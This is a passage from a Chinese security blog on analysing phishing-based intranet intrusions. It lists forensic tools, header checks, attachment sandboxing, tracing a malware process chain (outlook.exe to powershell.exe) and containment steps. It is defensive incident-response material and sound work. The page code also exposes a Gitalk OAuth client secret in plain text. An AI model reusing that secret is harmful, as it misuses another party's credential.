<p>WinDump: <a href="https://www.winpcap.org/windump/" target="_blank" rel="noopener">https://www.winpcap.org/windump/</a></p>
<p>Graphviz: <a href="http://www.graphviz.org/Download..php" target="_blank" rel="noopener">http://www.graphviz.org/Download..php</a></p>
<p>Capture-BAT: <a href="https://www.honeynet.org/node/315" target="_blank" rel="noopener">https://www.honeynet.org/node/315</a> (x86 environment only)</p>
<p>Fakenet: <a href="https://sourceforge.net/projects/fakenet/" target="_blank" rel="noopener">https://sourceforge.net/projects/fakenet/</a></p>
<p>Wireshark: <a href="https://www.wireshark.org/#download" target="_blank" rel="noopener">https://www.wireshark.org/#download</a></p>
<p><strong>第六类，邮件检测工具：</strong></p>
<p><a href="http://spf.myisp.ch/" target="_blank" rel="noopener">http://spf.myisp.ch/</a></p>
<p><strong>第七类，Google搜索</strong>，这也是最简单暴力但却十分有效的工具之一。</p>
<p>在分析内网入侵时合理地使用以上这些工具往往会有事半功倍的效果。另外，作为一个入侵分析和响应工程师切忌在没有网络隔离的情况下在办公电脑上直接访问可疑链接或者分析恶意样本文件。</p>
<h3 id="分析篇"><a href="#分析篇" class="headerlink" title="分析篇"></a>分析篇</h3><p>在前两篇中，我们分别谈到了企业内网入侵检测和防御所需要的安全平台建设和工具配置，有了这些基础我们便来聊聊如何运用这些已有的平台和工具来分析真实的内网入侵事件。</p>
<p>为了更好的说明这个问题，我将仍以最常见的利用钓鱼邮件入侵企业员工电脑并进而入侵内网为例来说明如何分析这类的入侵事件。为了能够检测和分析这类入侵事件，我们需要有能力获得最原始的钓鱼邮件，这就需要我们从至少以下几个途径来获取：</p>
<ul>
<li><p>企业员工主动提交可疑的钓鱼邮件，这就需要员工具备一定的安全意识（安全意识培训的重要性），以及统一的可疑邮件提交平台（需要开发成本）</p>
</li>
<li><p>邮件安全网关，如：Ironport，FireEye Email Security等</p>
</li>
<li><p>IOC检测平台，及时检测已知的恶意域名或者IP，可疑的发件人，恶意附件等</p>
</li>
</ul>
<p>当我们拿到了原始的钓鱼邮件，首先需要确保将其转化成EML文本格式（可用工具<a href="https://github.com/mvz/msgconvert），接着，我们至少需要从以下几个方面来分析：" target="_blank" rel="noopener">https://github.com/mvz/msgconvert），接着，我们至少需要从以下几个方面来分析：</a></p>
<ol>
<li><p>原始邮件头，包括：From, envelope-from, SPF, client-ip等</p>
<p> 1.1 可以通过dig命令，如：dig -t txt baidu.com，或使用工具<a href="https://github.com/BishopFox/spoofcheck" target="_blank" rel="noopener">spoofcheck</a>来检查邮件域名是否可以被spoof了</p>
<p> 1.2 对比From和envelope-from是否一致，也是应该判断是否为恶意邮件的有效方法</p>
</li>
<li><p>原始邮件正文，包括：域名／IP，URL，附件等</p>
<p> 2.1 域名/IP和URL的分析可以使用工具篇里提到的相应工具来分析，判断是否存在multi-stage C&amp;C</p>
<p> 2.2 附件的分析也可以使用工具篇里提到的在线／本地恶意程序分析沙箱或者自行逆向分析，进而了解恶意程序的执行逻辑以及对应的IOC(域名，URL，文件，注册表键值，执行的系统命令等)</p>
<p> 2.3 利用日志分析平台，查询恶意域名的DNS或者HTTP(S)流量日志，结合主机EDR（Endpoint Detection and Response）终端日志将DNS请求关联到相应的主机进程，如：ETW for Windows，BCC/eBPF for Linux等</p>
<p> 2.4 查询触发恶意域名的DNS请求的主机进程的整个进程树，分析malware完整的执行链，例如：outlook.exe -&gt; winword.exe -&gt; cmd.exe -&gt; powershell.exe</p>
<p> 2.5 查询所有触发了上述执行链的受感染主机，并重复2.4 的步骤直到没有新的执行链被发现为止</p>
</li>
</ol>
<p>在分析完了以上这些，我们就可以添加对应的防御和检测措施了，例如：</p>
<ol>
<li><p>通过应急响应章节中提到的DNS Sinkhole来阻断所有恶意域名的DNS请求</p>
</li>
<li><p>确保终端反病毒程序可以检测并清理每个阶段的恶意文件</p>
</li>
<li><p>添加防火墙规则来阻止内网主机对恶意IP地址的访问</p>
</li>
<li><p>隔离重装已经感染的主机进行</p>
</li>
<li><p>重置受感染内网用户的登录凭证</p>
</li>
<li><p>删除所有企业用户收到的来自同一恶意发送者的邮件</p>
</li>
<li><p>将分析得出的IOC添加到IOC检测平台</p>
</li>
<li><p>依据已发现的Malware执行链添加新的入侵检测规则</p>
</li>
</ol>
<p>至此，我已简单地介绍了一个相对完整的针对利用钓鱼邮件入侵企业员工电脑并进而入侵内网的入侵事件的分析和防御的方法与流程。 </p>

      

    </div>





    <footer class="article-footer">
      
        <a data-url="http://www.pa55w0rd.club/甲方安全建设的一些思路和思考/" data-id="cjop6hazo002moqt6713emeif" class="article-share-link" data-share="baidu" data-title="甲方安全建设的一些思路和思考 （转发）">分享到</a>
      

      
        <a href="http://www.pa55w0rd.club/甲方安全建设的一些思路和思考/#gitalk-container" class="article-comment-link">评论</a>
      

      

    </footer>
  </div>
  
</article>
<!--
<div class="share-component" data-disabled="" data-description="Share.js - 一键分享到微博，QQ空间，腾讯微博，人人，豆瓣">一键分享</div>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
-->







  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
    </nav>
  

</section>
      
      <aside id="sidebar">
  
    
  <div class="widget-wrap">

    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-file-text-o"></i>近期文章</h3>
    <div class="widget">
      <ul>
        
          <li onclick="javascript:document.getElementById('recentpost_item').click();">
            <a id="recentpost_item" href="/jekyll迁移hexo/">jekyll迁移hexo</a>
          </li>
        
          <li onclick="javascript:document.getElementById('recentpost_item').click();">
            <a id="recentpost_item" href="/lynis/">Lynis</a>
          </li>
        
          <li onclick="javascript:document.getElementById('recentpost_item').click();">
            <a id="recentpost_item" href="/git_edit_remoteurl/">Git修改远程URL</a>
          </li>
        
          <li onclick="javascript:document.getElementById('recentpost_item').click();">
            <a id="recentpost_item" href="/linux_firefox_error/">Centos 7 运行firefox出错</a>
          </li>
        
          <li onclick="javascript:document.getElementById('recentpost_item').click();">
            <a id="recentpost_item" href="/mongodb_auth/">mongodb开启认证</a>
          </li>
        
      </ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-tasks"></i>分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/note/">note</a><span class="category-list-count">17</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/企业安全/">企业安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全建设/">安全建设</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发安全/">开发安全</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/">移动安全</a><span class="category-list-count">3</span></li></ul>
    </div>
  </div>


  <script>
  $(document).on("click", "ul.category-list li.category-list-item", function () {
    window.location.href = $(this).find('a').attr('href')
  })
  </script>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-cloud"></i>标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/note/" style="font-size: 10px;">note</a>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-archive"></i>归档</h3>
    <div class="widget">
      <!-- <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">十一月 2018</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">十月 2018</a><span class="archive-list-count">25</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">一月 2018</a><span class="archive-list-count">1</span></li></ul> -->
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">2018年11月</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">2018年10月</a><span class="archive-list-count">25</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">2018年09月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">2018年01月</a><span class="archive-list-count">1</span></li></ul>
    </div>
  </div>


<script>
$(document).on("click", "ul.archive-list li.archive-list-item", function () {
  window.location.href = $(this).find('a').attr('href')
})
</script>

  
    
  <style>
  *{ margin: 0; padding: 0;}
  .tooltips{ border-width: 1px; border-style: solid; position: absolute; display: none; border-radius: 3px; opacity: 0; filter:alpha( opacity = 0) ; z-index: 999;}
  .tooltips p.content{ padding: 5px; }
  .tooltips .triangle-front,.tooltips .triangle-back{ width: 0; height: 0; overflow: hidden; border-width: 8px; border-style: solid; position: absolute; border-color: transparent ; top: 100%; left: 50%; margin-left: -8px;}
  .tooltips .triangle-back{ margin-top: -1px;}

  .toolTipInfo{ border-color: #000; background-color: #EEEEEE;}
  .toolTipInfo .triangle-front{ border-top-color: #EEEEEE;}
  .toolTipInfo .triangle-back{ border-top-color: #EEEEEE;}


  .icoSize{font-size: 2em}
  </style>



  <div class="widget-wrap">
    <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-link"></i>链接</h3>
    <div class="widget" style="z-index: 1;">





      <!-- <ul> -->
        
          <!-- <li> -->
          

          

                  <a id="github-alt-icon-color" class="weight-icon-link" target="_blank" href="https://github.com/Pa55w0rd">
                      <span class="fa-stack fa-lg">
                          <i class="fa fa-circle fa-stack-2x"></i>
                          <i class="fa fa-github-alt fa-stack-1x fa-inverse"></i>
                      </span>
                  </a>
          

          

          

          

          

          

          


          

          


          <!-- </li> -->
        
          <!-- <li> -->
          

          

          

          

          

          

          

          


          
                  <a id="envelope-o-icon-color" class="weight-icon-link" target="_blank" href="mailto:pa55w0rd@aliyun.com" data-toggle="tooltip" data-placement="top" title="请多多交流！">
                  <span class="fa-stack fa-lg">
                          <i class="fa fa-circle fa-stack-2x"></i>
                          <i class="fa fa-envelope-o  fa-stack-1x fa-inverse"></i>
                      </span>
                  </a>
          

          


          <!-- </li> -->
        
      <!-- </ul> -->
    </div>
  </div>


  <script>
  $.fn.extend({
    hoverTips : function (){
      var self = $(this);
      var sw = self.get(0).switch;
      if( !sw ) {
        sw = true;
        var content = self.attr("tooltips");
        var htmlDom = $("<div class='tooltips'>")
            .addClass("toolTipInfo")
            .html("<p class='content'></p>"
                + "<p class='triangle-front'></p>"
                + "<p class='triangle-back'></p>");
        htmlDom.find("p.content").html( content );
      }
      self.on("mouseover",function(){
        $("body").append( htmlDom );
        var left = self.offset().left - htmlDom.outerWidth()/2 + self.outerWidth()/2;
        var top = self.offset().top - htmlDom.outerHeight() - parseInt(htmlDom.find(".triangle-front").css("border-width"));
        htmlDom.css({"left":left,"top":top - 10,"display":"block"});
        htmlDom.stop().animate({ "top" : top ,"opacity" : 1},300);
      });
      self.on("mouseout",function(){
        var top = parseInt(htmlDom.css("top"));
        htmlDom.stop().animate({ "top" : top - 10 ,"opacity" : 0},300,function(){
          htmlDom.remove();
          sw = false;
        });
      });
    },

  });

  $("#weixin-icon-color").hoverTips();
  $("#qq-icon-color").hoverTips();
  </script>



  
    
    <div class="widget-wrap">
  
      <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-group"></i>友链</h3>
      <div class="widget">
        <ul>
        
            <li onclick="javascript:document.getElementById('friend_links_item').click();">
              <a id="friend_links_item" href="https://firexun.github.io/"><i class="fa  fa-arrow-circle-right" style="margin-right:7px"></i>青衫磊落</a>
            </li>

        
        </ul>
      </div>
    </div>
  
  
  
</aside>

      
    </div>
    <footer id="footer">
  
  <div data-scroll-reveal="enter bottom" class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 Pa55w0rd<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
      .
      Theme by <a href="https://github.com/HipHopCoderS/Landscape-x" target="_blank">Landscape-x</a>
    </div>

    <div id="footer-info" class="inner">
      <!-- id 将作为查询条件 
      <span id="<Your/Path/Name>" class="leancloud-visitors" data-flag-title="Your Article Title">
        <em class="post-meta-item-text">阅读量 </em>
        <i class="leancloud-visitors-count">1000000</i>
      </span>
-->
      <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1257415698'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s95.cnzz.com/z_stat.php%3Fid%3D1257415698%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>

    </div>
  </div>

</footer>

  </div>
  <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link"><i class="fa fa-home" aria-hidden="true"></i>首页</a>
  
    <a href="/archives" class="mobile-nav-link"><i class="fa fa-archive" aria-hidden="true"></i>归档</a>
  
    <a href="/about.html" class="mobile-nav-link"><i class="fa fa-user" aria-hidden="true"></i>关于我</a>
  
</nav>

  <!-- totop start -->
<div id="totop">
<a title="返回顶部"><img src="/img/betop.png"></a>
</div>

<!-- totop end -->



  <script>
    const gitalk = new Gitalk({
      clientID: "992fba235eb173826494",
      clientSecret: "d133f6427763be2cf4048e4d146a22043e745f22",
      repo: "www.pa55w0rd.club",
      owner: "Pa55w0rd",
      admin: "Pa55w0rd",
      // id: location.pathname,      // Ensure uniqueness and length less than 50
      id: "",      // Ensure uniqueness and length less than 50
      distractionFreeMode: false  // Facebook-like distraction free mode
    })
    gitalk.render('gitalk-container')
  </script>




<!-- 百度分享 start -->

<div id="article-share-box" class="article-share-box">
  <div id="bdshare" class="bdsharebuttonbox article-share-links">
    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
    <a class="article-share-more" data-cmd="more" title="更多"></a>
  </div>
</div>
<script>
  function SetShareData(cmd, config) {
    if (shareDataTitle && shareDataUrl) {
      config.bdText = shareDataTitle;
      config.bdUrl = shareDataUrl;
    }
    return config;
  }
  window._bd_share_config={
    "common":{onBeforeClick: SetShareData},
    "share":{"bdCustomStyle":"/css/bdshare.css"}
  };
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

<!-- 百度分享 end -->

<!-- <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script> -->
<script src="//cdn.bootcss.com/jquery/3.0.0-beta1/jquery.min.js"></script>



  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>



<! -- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
MathJax.Hub.Config({
tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
                processEscapes: true
                    
}
  
        });
</script>

<script type="text/x-mathjax-config">
MathJax.Hub.Config({
tex2jax: {
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
                  
}
    
        });
</script>

<script type="text/x-mathjax-config">
MathJax.Hub.Queue(function() {
            var all = MathJax.Hub.getAllJax(), i;
            for(i=0; i < all.length; i += 1) {
                            all[i].SourceElement().parentNode.className += ' has-jax';
                                    
            }
                
        });
</script>

<script type="text/javascript" src="http://cdn.bootcss.com/mathjax/2.5.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


<script src="/js/script.js"></script>


</div>
</body>
</html>



<div class="site-search">
  <div class="algolia-popup popup">
    <div class="algolia-search">
      <div class="algolia-search-input-icon">
        <i class="fa fa-search"></i>
      </div>
      <div class="algolia-search-input" id="algolia-search-input"></div>
    </div>
    <div class="algolia-results">
      <div id="algolia-stats"></div>
      <div id="algolia-hits"></div>
      <div id="algolia-pagination" class="algolia-pagination"></div>
    </div>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
  </div>
</div>


<script>
$(document).ready(function(){
window.scrollReveal = new scrollReveal({ reset: true});
//
})
</script>
